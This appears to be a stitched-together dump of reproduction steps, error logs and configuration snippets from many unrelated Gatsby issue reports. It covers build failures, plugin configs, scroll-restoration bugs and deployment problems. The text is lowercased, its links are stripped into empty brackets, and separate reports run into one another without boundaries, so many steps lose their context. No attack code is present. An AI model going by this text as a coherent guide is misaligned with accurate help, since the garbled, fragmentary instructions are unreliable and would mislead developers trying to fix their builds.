- /home/runner/work/schwigri/schwigri/node_modules/gatsby/cli.js error: cannot find module 'gatsby-cli/lib/reporter' require stack: - /home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/ is-valid-collection-path-implementation.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/ create-pages-from-collection-builder.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/ create-page-wrapper.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/ gatsby-node.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/resol ve-module-exports.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/load- plugins/validate.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/load- plugins/load.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/load- plugins/index.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/services/initia lize.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/services/index
js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/index .js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/commands/build
js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/node_modules/gatsby- cli/lib/create-cli.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/node_modules/gatsby- cli/lib/index.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bin/gatsby.js - /home/runner/work/schwigri/schwigri/node_modules/gatsby/cli.js - loader.js:965 function.module._resolvefilename internal/modules/cjs/loader.js:965:15 - loader.js:841 function.module._load internal/modules/cjs/loader.js:841:27 - loader.js:1025 module.require internal/modules/cjs/loader.js:1025:19 - v8-compile-cache.js:159 require [schwigri]/[gatsby]/[v8-compile-cache]/v8-compile-cache.js:159:20 - is-valid-collection-path-implementation.js:10 object.<anonymous> [schwigri]/[gatsby-plugin-page-creator]/is-valid-collection-path-implementat ion.js:10:40 - v8-compile-cache.js:178 module._compile [schwigri]/[gatsby]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:1157 object.module._extensions..js internal/modules/cjs/loader.js:1157:10 - loader.js:985 module.load internal/modules/cjs/loader.js:985:32 - loader.js:878 function.module._load internal/modules/cjs/loader.js:878:14 - loader.js:1025 module.require internal/modules/cjs/loader.js:1025:19 - v8-compile-cache.js:159 require [schwigri]/[gatsby]/[v8-compile-cache]/v8-compile-cache.js:159:20 - create-pages-from-collection-builder.js:28 object.<anonymous> [schwigri]/[gatsby-plugin-page-creator]/create-pages-from-collection-builder .js:28:44 - v8-compile-cache.js:178 module._compile [schwigri]/[gatsby]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:1157 object.module._extensions..js internal/modules/cjs/loader.js:1157:10 - loader.js:985 module.load internal/modules/cjs/loader.js:985:32 - loader.js:878 function.module._load internal/modules/cjs/loader.js:878:14 not finished load plugins - 0.459s
npm err! code elifecycle
npm err! errno 1
npm err! schwigri@1.0.0 build: `gatsby build`
npm err! exit status 1
npm err! npm err! failed at the schwigri@1.0.0 build script.
npm err! this is probably not a problem with npm
there is likely additional logging output above
npm err! a complete log of this run can be found in:
npm err! /home/runner/.npm/_logs/2020-08-10t23_51_41_492z-debug.log
##[error]process completed with exit code 1.
install npm
npx gatsby new test
npx gatsby develop
in `gatsby-config.js` under `gatsby-source-shopify`, add:
shopifyqueries: { product: <<default_product_query>>
build w/ this config to ensure all queries work properly.
if build succeeds, edit the default query by adding `availablequantity` on the variants object
variants(first: 250) { edges { node { availablequantity ...
the build should fail during shopify queries.
npx gatsby new gatsby-eslint
cd gatsby-eslint
yarn add -d gatsby-plugin-eslint eslint-loader eslint eslint-plugin-react-app
touch .eslintrc
``` add the following to `.eslintrc`:
{ "extends": ["plugin:react-app/recommended"]
``` add the plugin to `gatsby-config.js`:
```diff plugins: [
+ `gatsby-plugin-eslint`, ...
``` minimal reproduction:
create a new space in contentful.
upload anything in the media tab
(this is due to a bug when attempting to query.)
head to settings > api keys and either use the available api key or create a new one
follow the guide below to install a local version of hasura using docker.
or you can use the one-click option for heroku
(you will need to update the .env file to point to the app url.)
#deploy-heroku head to your hasura console and select the remote schema tab at the top.
graphql server url - {your-space-id}
headers - authorization : bearer {your-cda-key-from-contentful} here is a link to a minimum reproducible repo:
simply adding a field to `mdx` will cause it to break, e.g.: ```js
export const createschemacustomization = async ({ actions: { createtypes } }) => { const typedefs = ` type mdx implements node { foo: string! } `; createtypes(typedefs);
i am using fluent ui , in gatsby-browser - import "./src/css/fabricui.css" then use the css on the index.js page i works as expected in dev but not in build in gatsby-browser - import "./src/css/fabricui.css" then use the css on the index.js page i works as expected in dev but not in build
this is a simple codesandbox with `gatsby-transformer-asciidoc` plugin and dependency added with a `pages/doc.adoc` file
no other changes from the default template
run `gatsby develop`
yarn global add gatsby-cli
`npm i gatsby-cli`
clone this repo
install dependencies
run the deploy script i can't share my github credentials, so reproduction won't be possible per se
a demo repo has been created with this link [link](
i hosted it on netlify with this [link]( without the gatsby clean command, the second build fails.
<img width="888" alt="screenshot 2020-08-05 at 22 59 49" src=" "> i have created a new blog post called image breaking that i used to experiment and test the issue
* run the repo with gatsby develop
* change the markdown by adding the double space on a list (error only occurs if there are multiple list item that contains double space)
* you should immediately see that the image on /blog is missing or the page is broken because it is trying to find the childimagesharp
sometimes it only occurs on the second gatsby develop (terminate the first develop and then repeat the step)
clearing the cache with gatsby clean, resets the issue
i assume there maybe a problem of how it is handled in cache?
i added `gatsby-plugin-preact` and then installed` preact` and `preact-render-to-string`
i deleted `react` and then everything worked fine
after removing 'react-dom' i cannot run the application.
[i e created a demo repository here.]( it based on `gastby-starter-blog`, and [this is the git diff between them](
git clone
cd gatsby-rss-demo
npm install
gatsby build
install gatsby-source-mysql
configure gatsby-config.js as described in gatsby docs ```
{ resolve: `gatsby-source-mysql`, options: { connectiondetails: { host: 'localhost', user: 'root', password: '', database: 'mysql' }, queries: [ { statement: 'select * from job_posts', idfieldname: 'jobs', name: 'posts' }, ] } }
query from graphql in localhost:8000/___graphql ```
query myquery { allmysqlposts { edges { node { slug } } }
this is an intermittent problem and i haven't been able to find a clear reproducible case
i'm keeping notes and will hopefully be able to update this issue when i have a clear use case
part of this issue is to see if there is a shared problem here and other wisdom i can learn from.
install latest gatsby cli using --> npm i -g gatsby-cli use gatsby-cli
{ resolve: `gatsby-plugin-sitemap`, options: { createlinkinhead: true, query: `{ site { sitemetadata { siteurl } } allsitepage { nodes { path context { updated } } } }`, resolvesiteurl: ({ site }) => { return site.sitemetadata.siteurl; }, serialize: ({ site, allsitepage }) => allsitepage.nodes.map((node) => { return { url: `${site.sitemetadata.siteurl}${node.path}`, changefreq: `daily`, priority: 0.7, lastmod: `${node.context.updated}`, }; }), }, },
- i run `gatsby develop` and app is loaded ok
- i edit any source code (be it a component or a graphql query)
- `gatsby develop` script rebuilds sources without any error
view on safari with a screen width < 750px
go to
select dark mode
click any starter from grid (ex
i will set up a basic repo if necessary, as it's not a super easy setup.
i've dug into this for a while and i think (probably, since i'm not very familiar to gatsby) i've found the actual cause of the problem
instead, i'll simply write down what i've found during my analysis
if i was wrong, please point me out
it all started in `root.js` #l68-l72 it imports `shouldupdatescroll` from `navigate.js`: #l125-l151 it uses `apirunner`, which i suppose (due to the lack of knowledge about the internals) should collect `shouldupdatescroll` from all plugins, which, in my case, is only provided by `gatsby-remark-autolink-headers`
this function is then passed to `scrollhandler`, which uses it in its `shouldupdatescroll` instance method: #l91-l102 so who uses `this.shouldupdatescroll`? the answer is `windowscroll` and `scrolltohash`: #l71-l89 the problem is that both method didn't actually use the return value of `shouldupdatescroll`, so if the return value is an array, it is simply ignored
### relationship to other issues my motive is that we wanted to click on markdown headers and update the hash, and found out that sometimes, clicking on a header makes it jump to the screen top, and sometimes it doesn't
that is similar to the behaviour described in #25778
first i thought that maybe `gatsby-remark-autolink-headers` got something wrong, but it didn't
the actual cause is, again, rooted within `gatsby-react-router-scroll`
so in `componentdidupdate`: #l56-l69 this is supposed to be called when the path changes, and tries to restore the user's last scroll position on the new page, however it also gets called when the page hash updates, when it still tries to do the same thing
that said, clicking on an in-page anchor does two things: 1
updates page hash, emitting a `hashchange` event.
scrolls (actually jumps) to the referenced element, emitting a `scroll` event
if the former comes first, the router calls `componentdidupdate`, which uses the last scroll position and calls `window.scroll`, which somehow 'cancels out' the latter one (i presume that's because the browser sends only one `scroll` event per frame), so in the end, nothing changes
if the latter comes first, the page first scrolls, updating last scroll position, and `componentdidupdate` calls `window.scroll` with the new scroll position, so the page jumps to the desired position
that might solve the myth of #25778, although in my case another weird thing is that my browser (chrome 84.0.4147.89) seems to stick to an order for an uncertain amount of time, and then switches to another
the simple solution is to return `false` from `shouldupdatescroll` when nothing but the hash changes, and let the browser do everything for you, but i'm thinking about preventing the auto-jump behavior of the browser and passing control to `shouldupdatescroll`, however had yet no luck of finding a solution
hope that'd be of help.
`npm run build` and check output
see the numerous previous issues about "source and transform nodes"
i setup a reproduction repo, based on gatsby-default starter, following the description [how to use storybook with gatsby](
[reproduction repo](
project:
run gatsby serve
go to:
inspect html dom:
![obraz](
please see the reproduction demo in
the repo is a gatsby-starter project where mostly only `layout.js` is changed
the component that the issue occurs in is `mobilecontainer`
start `gatsby develop` and observe that the page loads correctly with large and small (mobile) browser window size
the mobile view gives a collapsed menu
build the project with `gatsby build` and then `gatsby serve`
observe that the mobile view (narrow browser) is not correct, but the desktop (wider browser) is fine.
add `<div id="grnhse_app"></div>`
then below add `<script src=" "></script>`
then load page, works fine
second load/or refresh does not work
unregister the service worker, refresh page, works fine.
see #issuecomment-675508616
go to my deployed site\'s "gallery" page (here and click on a gallery item.
unfortunately this issue only happens when we deploy to production, so i'm not sure how i can help you to reproduce it without breaking our docs :/
1)
2) navigate from the landing page to any other page
3) the page is blank 4) view console to see the above error
5) refresh the page, content will load
here's a link to my repo:
[ 1
clone my repo and head to the project directory
run `npm install --save netlify-cms-app gatsby-plugin-netlify-cms`
go to
wait a moment
note that 404s appear for the examples as in the following screenshot
it's every example except the one-liner javascript example about filtering on multiple fields
![gatsby-404](
go to [ or run locally (use `gatsby serve`, not `gatsby develop` to see the effect)
in your dev tools, enable cache and throttle network to something very slow.
switch pages (there are links provided on the page to make switching easy).
check the console log to see see when the gatsby image mounts and unmounts (this appears to be an issue with the image cache, not unmounting) repo: [
sample site: [
source of readme: #l167
location: just above #fit ### screenshot <img width="302" alt="bildschirmfoto 2020-07-24 um 13 39 19" src=" "> ### examples bad ones - point to files in the repo:
- `![sharp transform fit options](./sharp-transform-fit-options.png)`
- `[index.js](./src/index.js)` good ones:
- external full links -> `[overlaywith]( #overlaywith)`
- points to gatsbyjs.org -> `[gatsby-image](/packages/gatsby-image/)`
"@material-ui/core": "^4.11.0", "@material-ui/icons": "^4.9.1", "gatsby-plugin-material-ui": "^2.1.9" are set up and i\'ve added custom plugin for material-ui theme similar as here (gatsby-browser.js and gatsby-ssr.js are identical) simply this is it, i\'ve just created some components with material-ui and this problem appears
also, i have one clue why with the header there is some differences (no styles when js is disabled and all looks good when enabled), i've add a header to the wraprootelement:
`export const wraprootelement = ({ element }) => ( <themeprovider theme={theme}> <cssbaseline /> <mainpageheader /> {element} </themeprovider>
demolink: [ 1
gatsby build
gatsby serve
no idea yet
have no idea
open the link above in safari on ipad, look at the right column.
install `gatsby-cli`, then ```shell
% gatsby --version
gatsby cli version: 2.12.65 % gatsby info error unhandled rejection e.filter is not a function typeerror: e.filter is not a function - envinfo.js:1 [lib]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:73205 - async promise.all
i can't reliably reproduce.
follow this [link](
after deploying check console of the browser
meros created a [repro repo]( and provided it in [this comment](
look at the checks in [this pr]( and see how `ci/circleci: lint` says "your tests passed on circleci!" ![a github pr with passing checks]( when this pr was merged to master, it broke the build: ![circleci showing failing checks](
rename `src/pages/index.js` to `src/pages/home.js`.
create `src/pages/index.js` with the following contents: ```javascript export { default } from "./home"; ```
run `npm run build`.
change contents of `src/pages/index.js` to: ```javascript export { default as default } from "./home"; ```
run `npm run build` again.
- - it appears when selecting hammersmith & city
missing tube lines i am retrieving location from a csv and it is truncating the results
i'll try to make a repro demo but have literally zero time now.
just add path prefix build on a page which load .svg type images.
it's a bit complicated my specific case, but i'll try to create a minimal reproduction.
run any gatsby projet with resolutions set to 15.3.0 for graphql.
git clone
git checkout themes-refactor
npm install
npm run build
add gatsby-plugin-offline to a new gatsby site
create a site with 2 pages, page1.html and page 2.html
add link (using gatsby link) from page1.html to page 2 with a hash e.g
page2.html#a-section
build the site
navigate to page1, click the link to page 2
make a small code change and build the site again
navigate to page1, click the link to page 2
upgrade your gatsby with npm update or yarn upgrade
create a new app with `gatsby new test-app` type ` gatsby develop`
you will get this stack: ```
prebuilt/yoga-layout/build/release/nbind.js:53 throw ex; ^ error: cannot find module './localmoduledependency'
require stack:
[stack] ```
gatsby develop
hit refresh endpoint
wait until refresh finishes
hit refresh endpoint
- open
- look at iframes
- or open one of the queries ([basic query](
open a new powershell tab in windows terminal (my terminal was not in full screen if that helps in anyway)
follow the steps [here]( for windows to setup your gatsby development environment
in the step where you [create a gatsby test site]( #create-a-gatsby-site) using the gatsby new command you are asked to select the package manager
the ui here is completely broken as you are unable to view the options properly (even finding out what it wants is hard if you're not used to the terminal).
for the following to work, we'll assume a pretty standard website structure:
- homepage and another page
- header with a link to the homepage on the logo
- footer with a link _this is for illustration purposes only
other reproduction scenarios are possible_ 1
make sure you have latest version of gatsby installed - `gatsby@2.24.3`
run `gatsby develop`
from your homepage, click on a link that isn't at the very top of the page (e.g
your site's footer)
you can check this in your devtools console by logging out `window.scrolly`
as long as it's more than `0` then you're good.
once you navigate to a new page, click on a link back to the homepage in your header.
observe scroll position of the homepage
the scrolltop position is not at `0` (you can verify as detailed in step 3)
visit the documentation page to observe the missing command: `npm install tailwindcss --save-dev` select the [edit this page on github]( link near the bottom of the screen to navigate to the markdown file on github
you will see that the command is in the .md file.
unfortunatelly i cannot share my code cause it is corporate internal app, but i've downloaded gatsby-starter-blog and gatsby-advanced-starter and both are missing status bar when run gatsby develop
random example: , check under "indexing" where a code sample is missing
<img width="644" alt="screen shot 2020-07-16 at 11 35 26 am" src=" ">
![imagen]( **image.js** ```
import react from "react"
import { usestaticquery, graphql } from "gatsby"
import img from "gatsby-image" /* * this component is built using `gatsby-image` to automatically serve optimized * images with lazy loading and reduced file sizes
the image is loaded using a * `usestaticquery`, which allows us to load the image from directly within this * component, rather than having to pass the image data down from pages
* * for more information, see the docs: * - `gatsby-image`: * - `usestaticquery`: */ const image = () => { const data = usestaticquery(graphql` query { placeholderimage: file(relativepath: { eq: "gatsby-astronaut.png" }) { childimagesharp { fluid(maxwidth: 300 quality: 90) { ...gatsbyimagesharpfluid } } } } `) return <img fluid={data.placeholderimage.childimagesharp.fluid} />
} export default image
``` **gatsby-config.js** module.exports = { sitemetadata: { title: `gatsby default starter`, description: `kick off your next, great gatsby project with this default starter
this barebones starter ships with the main gatsby configuration files you might need.`, author: `@gatsbyjs`, }, plugins: [ `gatsby-plugin-react-helmet`, { resolve: `gatsby-source-filesystem`, options: { name: `images`, path: `${__dirname}/src/images`, }, }, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-plugin-manifest`, options: { name: `gatsby-starter-default`, short_name: `starter`, start_url: `/`, background_color: `#663399`, theme_color: `#663399`, display: `minimal-ui`, icon: `src/images/gatsby-icon.png`, // this path is relative to the root of the site
}, }, // this (optional) plugin enables progressive web app + offline functionality // to learn more, visit: // `gatsby-plugin-offline`, ],
} **package.json** { "name": "gatsby-starter-default", "private": true, "description": "a simple starter to get up and developing quickly with gatsby", "version": "0.1.0", "author": "kyle mathews <mathews.kyle@gmail.com>", "dependencies": { "gatsby": "^2.23.12", "gatsby-image": "^2.4.9", "gatsby-plugin-manifest": "^2.4.14", "gatsby-plugin-offline": "^3.2.13", "gatsby-plugin-react-helmet": "^3.3.6", "gatsby-plugin-sharp": "^2.6.14", "gatsby-source-filesystem": "^2.3.14", "gatsby-transformer-sharp": "^2.5.7", "prop-types": "^15.7.2", "react": "^16.12.0", "react-dom": "^16.12.0", "react-helmet": "^6.1.0" }, "devdependencies": { "prettier": "2.0.5" }, "keywords": [ "gatsby" ], "license": "0bsd", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write \\"**/*.{js,jsx,ts,tsx,json,md}\\"", "start": "npm run develop", "serve": "gatsby serve", "clean": "gatsby clean", "test": "echo \\"write tests! -> " && exit 1" }, "repository": { "type": "git", "url": " " }, "bugs": { "url": " " }
clone the gatsby starter
upgrade dependencies to latest via `npx npm-check-updates -u` 1
this includes gatsby 2.24.3
run `npm i` to install these dependencies
create a page with hash links to elements on a page with matching ids (see example repo and site)
click the internal hash anchors to try to jump up and down the page.
add custom component import to the **layout.js** like that: `import header from "./header";` ### aws build log ```
2020-07-15t15:35:27.355z [info]: $ gatsby build
2020-07-15t15:35:29.447z [info]: success open and validate gatsby-configs - 0.036s
2020-07-15t15:35:30.291z [info]: success load plugins - 0.843s
2020-07-15t15:35:30.303z [info]: success onpreinit - 0.012s
2020-07-15t15:35:30.324z [info]: success delete html and css files from previous builds - 0.020s
2020-07-15t15:35:30.346z [info]: success initialize cache - 0.022s
2020-07-15t15:35:30.363z [info]: success copy gatsby files - 0.016s
2020-07-15t15:35:30.832z [info]: success onprebootstrap - 0.469s
2020-07-15t15:35:30.867z [info]: success createschemacustomization - 0.006s
2020-07-15t15:35:31.336z [info]: success source and transform nodes - 0.469s
2020-07-15t15:35:31.588z [info]: success building schema - 0.251s
2020-07-15t15:35:31.612z [info]: success createpages - 0.023s
2020-07-15t15:35:31.657z [info]: success createpagesstatefully - 0.045s
2020-07-15t15:35:31.681z [info]: success updating schema - 0.024s
2020-07-15t15:35:31.682z [info]: success onpreextractqueries - 0.000s
2020-07-15t15:35:31.954z [info]: success extract queries from components - 0.271s
2020-07-15t15:35:31.956z [info]: success write out redirect data - 0.001s
2020-07-15t15:35:32.227z [info]: success build manifest and related icons - 0.270s
2020-07-15t15:35:32.229z [info]: success onpostbootstrap - 0.271s info bootstrap finished - 4.858s
2020-07-15t15:35:32.410z [info]: success run static queries - 0.178s - 4/4 22.52/s
2020-07-15t15:35:32.882z [info]: success run page queries - 0.452s - 6/6 13.26/s success write out requires - 0.005s
2020-07-15t15:35:47.921z [info]: failed building production javascript and css bundles - 15.050s
2020-07-15t15:35:47.925z [warning]: error generating javascript bundles failed can't resolve 'footer' in '/codebuild/output/src800686228/src/gatsby-website/src/components' if you're trying to use a package make sure that 'footer' is installed
if you're trying to use a local file make sure that the path is correct.
2020-07-15t15:35:47.926z [warning]: error generating javascript bundles failed can't resolve 'header' in '/codebuild/output/src800686228/src/gatsby-website/src/components' if you're trying to use a package make sure that 'header' is installed
if you're trying to use a local file make sure that the path is correct.
2020-07-15t15:35:47.927z [info]: not finished generating image thumbnails - 15.678s
2020-07-15t15:35:48.020z [warning]: error command failed with exit code 1.
2020-07-15t15:35:48.021z [info]: info visit for documentation about this command.
2020-07-15t15:35:48.026z [error]: !!! build failed
2020-07-15t15:35:48.026z [error]: !!! non-zero exit code detected
2020-07-15t15:35:48.026z [info]: # starting environment caching...
2020-07-15t15:35:48.027z [info]: # environment caching completed
terminating logging...
->clone
->go to the root & then run the following commands
cd with-gatsby/
yarn install
yarn gatsby develop reference:
set up a sample project
$ npx gatsby-cli new reproduce-gatsby-issue-async-await
$ cd reproduce-gatsby-issue-async-await
$ yarn upgrade --latest # 2
edit src/pages/index.js with async function # 3
build and serve project
$ yarn gatsby build && yarn gatsby serve # 4
then, open in a browser
``` in `src/pages/index.js`, add async function code to display `console.log` after 1 second in `useeffect`
<summary>diff from default project</summary> ```diff
diff --git a/src/pages/index.js b/src/pages/index.js
index 6f061ca..b21110b 100644
--- a/src/pages/index.js
+++ b/src/pages/index.js
@@ -1,14 +1,28 @@
-import react from "react"
+import react, { usestate, useeffect } from "react" import { link } from "gatsby" import layout from "../components/layout" import image from "../components/image" import seo from "../components/seo" -const indexpage = () => (
+export const wait = ms =>
+ new promise(resove => {
+ settimeout(resove, ms)
+const indexpage = () => {
+ const [waited, setwaited] = usestate(false)
+ useeffect(() => {
+ ;(async () => {
+ await wait(1000)
+ setwaited(true)
+ return ( <layout> <seo title="home" />
- <h1>hi people</h1>
+ <h1>hi people{waited && " - worked!"}</h1> <p>welcome to your new gatsby site.</p> <p>now go build something great.</p> <div style={{ maxwidth: `300px`, marginbottom: `1.45rem` }}>
@@ -17,6 +31,7 @@ const indexpage = () => ( <link to="/page-2/">go to page 2</link> <br /> <link to="/using-typescript/">go to "using typescript"</link> </layout>
+} export default indexpage ```
</details> the reproduction project is here.
make sure you have latest version of gatsby installed - `gatsby@2.24.2`
run `gatsby develop`
click on a link that isn't at the very top of the page (e.g
your site's footer)
you can check this in your devtools console by logging out `window.scrolly`
as long as it's more than `0` then you're good.
once you navigate to a new page observe that your scrolltop position is not `0` (again, can verify as detailed in the previous step)
- set up the gatsbyjs.org site locally
- run `gatsby develop`
- view a docs page, such as
pushing code to a branch that gatsby cloud is wired to deploy.
i created a repo for this, to help reproduce the issue
[ 1
clone the project and yarn install
build the project and run a performance tooling locally ```bash yarn serve; // builds and the starts the application at ` ` ``` 3
on chrome, open dev tools, switch to the performance tab and run a profile
observe the frames, you will see that the images disappeared and reappeared at some point
to prove that the images disappeared only after/during hydration, i had to render two images, one renders at the server, another renders after mount
by inspecting the frame screenshots, you will observe that the second image also rendered, then disappeared, and then loaded again
the same as the first image.
gatsby new gatsby-starter-business
this is project that has been working for a few months and i've updated yesterday and now i'm getting the above error message
not sure right now
1 gatsby new my-default-starter
remove .git folder
re-init git and push it to github
netlify init
go through the options to link the site to netlify - build command: gatsby build
- deploy folder: public _sometimes_: 6
run "netlify dev --live"
copy paste the url that is generated in the terminal to the browser.
open the console, and see the mixed content type errors
_other times:_ 6
add install the sass dependencies and add the plugin to the array of plugins in the gatsby-config.
run "git push origin master" to trigger automatic deploy to netlify.
allow time for site to build
there are no errors in the build log.
(there was a message about a config file being missing, so they use defaults)
go to link of deployed site
see a 404 error in the window.
see the logs of the mixed content erros in the consol.
use the plugin with peer dependency `@mdx-js/mdx` at 1.5.8 or less
```bash
$ yarn build # will fail
$ yarn add @mds-js/mdx@1.5.9
$ yarn build # will succeed
i think this issue cant be reproduced unless you try to build my repo [here](
goto this is a validator of the site airmilkshake.com , which utilizes the gatsby image component
the errors are shown on that page as well as in the screenshot above.
not super sure here since it only happens sometimes
but you can see the page in question on my repo here:
```bash npm install -g gatsby-cli
``` ```bash gatsby new gatsby-starter-ghost
gatsby develop
error #98124 webpack (error message above)
here is the offending code, i am getting an error on the first line that calls `navigate`
import { navigate } from 'gatsby'
import * as react from 'react' import layout from '../layout/sitelayout'
import { routeprops } from '../../types'
import { isadmin, isloggedin } from '../../utils/auth' const routeadmin = ({ component: component, location, ...rest
}: routeprops) => { const { path, title, description } = rest if (!isloggedin()) { navigate(`/user/login`) return null } if (!isadmin()) { navigate(`/`) return null } return ( <layout path={path} title={title} description={description} darktheme={false} > <component {...rest} /> </layout> )
} export default routeadmin
i can provide an environment to reproduce.
using a graphql static query, add ```graphql
childimagesharp { fluid( maxwidth: 512 maxheight: 512 fit: contain background: "#ffffff" ) { ...gatsbyimagesharpfluid_withwebp }
``` query to your image, see image blur up from black image to white
![screen recording 2020-07-09 at 12 27 37 pm]( codesandbox example
download 'gatsby personal starter blog' from the gatsby cms tutorial
i've tried to configure my windows 10 environment as that seemed to cause initial issues (but may not have ironed out everything)
type 'gatsby develop' in command line.
product.js was created under src/pages folder and it included a react component
build the app with `gatsby build`
run the app with `gatsby serve`
nagivate to
on chrome, safari, it works well.
npm install -g gatsby-cli
gatsby new gatsby-site
cd gatsby-site
gatsby develop
run `yarn link` on any gatsby-theme-[name]
run `yarn link gatsby-theme-[name]` in the site using that theme and install dependencies with `yarn`
run `gatsby build` and the error should appear
gatsby new [your-project-name]
cd to project
npm install sharp
gatsby develop
pick a version that you'd like to rollback to from here -
click on the version, then click on commit called `chore(release): publish`
find `packages/gatsby/package.json` in files changed and keep this tab open for reference
in your terminal downgrade gatsby to a different version like so `yarn upgrade gatsby@x.xx.xx` where x represents your chosen gatsby version
check your yarn.lock under `gatsby@x.xx.xx` and compare installed packaged versions to those you see in the changelog
run the [minimal reproduction]( and navigate to the site root in a browser
clone default starter and remove `index.js` page: ```shell
gatsby new gatsby-default-starter && \\
cd gatsby-default-starter && \\
rm src/pages/index.js
``` add a client-side redirect from `/` to `page-2` in `gatsby-node.js` like: ```js
const siteredirects = [ { frompath: "/", topath: "/page-2", ispermanent: false, redirectinbrowser: true, },
] exports.createpages = async ({ actions, graphql, reporter }) => { const { createredirect } = actions siteredirects.foreach(redirect => createredirect(redirect))
``` then run `gatsby develop` and access the site from the base url (e.g
add some `console.log` calls to an empty gatsby page and run `gatsby build` eg.
import react from "react" console.log(1)
console.log(2) const indexpage = () => null export default indexpage
here's my gatsby-ssr.js
// import "./src/styles/_global.scss" const react = require("react")
const { helmet } = require("react-helmet") // import react from \'react\'
// import helmet from 'react-helmet' exports.onrenderbody = ( { setheadcomponents, sethtmlattributes, setbodyattributes }, pluginoptions
) => { const helmet = helmet.renderstatic() sethtmlattributes(helmet.htmlattributes.tocomponent()) setbodyattributes(helmet.bodyattributes.tocomponent()) setheadcomponents([ helmet.title.tocomponent(), helmet.link.tocomponent(), helmet.meta.tocomponent(), helmet.noscript.tocomponent(), helmet.script.tocomponent(), helmet.style.tocomponent(), ])
} exports.onprerenderhtml = ({ getheadcomponents, replaceheadcomponents }) => { const headcomponents = getheadcomponents() headcomponents.sort((x, y) => { if (x.props && x.props["data-react-helmet"]) { return -1 } else if (y.props && y.props["data-react-helmet"]) { return 1 } return 0 }) replaceheadcomponents(headcomponents)
} // export { default as wraprootelement } from './src/store/reduxwrapper';
exports.wraprootelement = require('./src/store/reduxwrapper')
``` here's my gatsby-config.js ```
module.exports = { /* your site config here */ sitemetadata: { title: "india trusted lifestyle services | busi bsuisa", description: "experience the most exclusive aeroplane rental services and dedicated lifestyle concierge
book your private jets and helicopters in minutes at best prices.", author: "@bagchi-mihir", twitterusername: "@teenage_dirtbag_10", image: "/some-img.png", siteurl: " ", }, plugins: [ `gatsby-plugin-react-helmet`, `gatsby-plugin-sass`, `gatsby-plugin-material-ui`, { resolve: `gatsby-plugin-favicon`, options: { logo: "./src/assets/iconsmall2.png", // webapp manifest configuration appname: \'noflu\', // inferred with your package.json appdescription: "experience the most exclusive aeroplane rental services and dedicated lifestyle concierge
book your private jets and helicopters in minutes at best prices.", developername: \'mihir bagchi\', developerurl: \' dir: \'auto\', lang: \'en-us\', background: \'#cdab82\', theme_color: \'#cdab82\', display: \'standalone\', orientation: \'any\', start_url: \'/?homescreen=1\', version: \'1.0\', icons: { android: true, appleicon: true, applestartup: true, coast: false, favicons: true, firefox: true, yandex: false, windows: false } } }, { resolve: `gatsby-plugin-gtag`, options: { trackingid: `ua-164667005-2`, head: true, anonymize: false, }, }, ], }
``` here's my html.js if relevant
import react from "react"
import proptypes from "prop-types" export default function html(props) { return ( <html {...props.htmlattributes}> <head> <meta charset="utf-8" /> <meta httpequiv="x-ua-compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> {props.headcomponents} {/*<script src=" "></script> <script>window.sntchchat.init(115xxx)</script>*/} </head> <body {...props.bodyattributes}> {props.prebodycomponents} <div key={`body`} id="___gatsby" dangerouslysetinnerhtml={{ __html: props.body }} /> {props.postbodycomponents} </body> </html> )
} html.proptypes = { htmlattributes: proptypes.object, headcomponents: proptypes.array, bodyattributes: proptypes.object, prebodycomponents: proptypes.array, body: proptypes.string, postbodycomponents: proptypes.array,
make sure there's gif in your feature image
create a new gatsby project using the default starter
open it in the browser.
press f12 and go to the console
watch as the errors roll in,
**$: gatsby develop
in emacs: editing about.jsx
$: error: enoent: no such file or directory, stat '/home/dipper/workspace/video_front_end/src/components/about/.#about.jsx'**
start up a develop instance of gatsby, in browser devtools inspect websocket connections
there should be two, one is to the proxy port(definable via `--port`), while the other is for the `statusserverport` and is always random.
get to tutorial four, "data in gatsby":
run `$ npm install --save gatsby-plugin-typography typography react-typography typography-theme-kirkham gatsby-plugin-emotion @emotion/core`
run `$ gatsby develop`
i created a basic demo project [here](
if you open for example and scroll to the bottom, you can see table of content there
i created a [recording]( where i click on items in table of contents and nothing happens.
download the example folder from the tutorial:
in `./source-plugin/gatsby-node.js`, in the oncreatenode function: add the code `console.log('oncreatenode!', node.internal.type)` to see if this function is called and for which type of nodes.
`mv ./source-plugin ./example-site/plugins`
`gatsby develop`
- clone repo
- run `npm install`
- run `npm start`
* navigate to a page
* toggle code view
* refresh **possible source of problem**
* someone pointed out that on the linked deploy, the issue is present when paths have a trailing slash (ex: x.com/about/ instead of x.com/about)
despite all the combinations of slash removal tools, the issue is still there
**associated images** * regular view:
[imgur]( * code view:
[imgur]( * code view upon refresh:
[imgur]( **associated code** * resume (page in pic): * codeview: * topbar:
scroll to bottom of post listing page
click any links
notice the next loaded page is scrolled to the bottom like previous page **>>>** [minimal reproduction](
with the local dev server it all works fine
after deploy: => redirects to but => loads ok
you can check the code for the offending page right here:
[
- open pull requests
- look for gatsby-cloud-staging bot comments: > your pull request can be previewed in gatsby cloud: [build-7fc27aa0-17af-4d22-a96b-444e8261e2ba.staging-previews.gtsb.io]( #issuecomment-653309532
run `gatsby new` in windows terminal
you should have both yarn and npm installed on your system.
i have this in `gatsby-node.js`
